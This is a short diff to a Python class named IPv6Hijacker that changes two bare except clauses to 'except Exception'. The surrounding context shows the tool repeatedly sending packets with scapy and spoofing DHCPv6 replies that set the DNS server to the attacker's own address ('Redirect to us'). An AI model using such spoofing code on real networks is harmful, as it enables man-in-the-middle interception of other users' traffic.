@@ -45,7 +45,7 @@ class IPv6Hijacker:
         )
         while self._running:
             try: sendp(pkt, iface=self.iface, verbose=False)
-            except: pass
+            except Exception: pass
             time.sleep(3)
 
     def _dhcp_sniff(self):
@@ -63,7 +63,7 @@ class IPv6Hijacker:
                 DHCP6OptDNSServers(dnsservers=["fe80::1"]) # Redirect to us
             )
             try: sendp(adv, iface=self.iface, verbose=False)
-            except: pass
+            except Exception: pass
 
         while self._running:
             try:
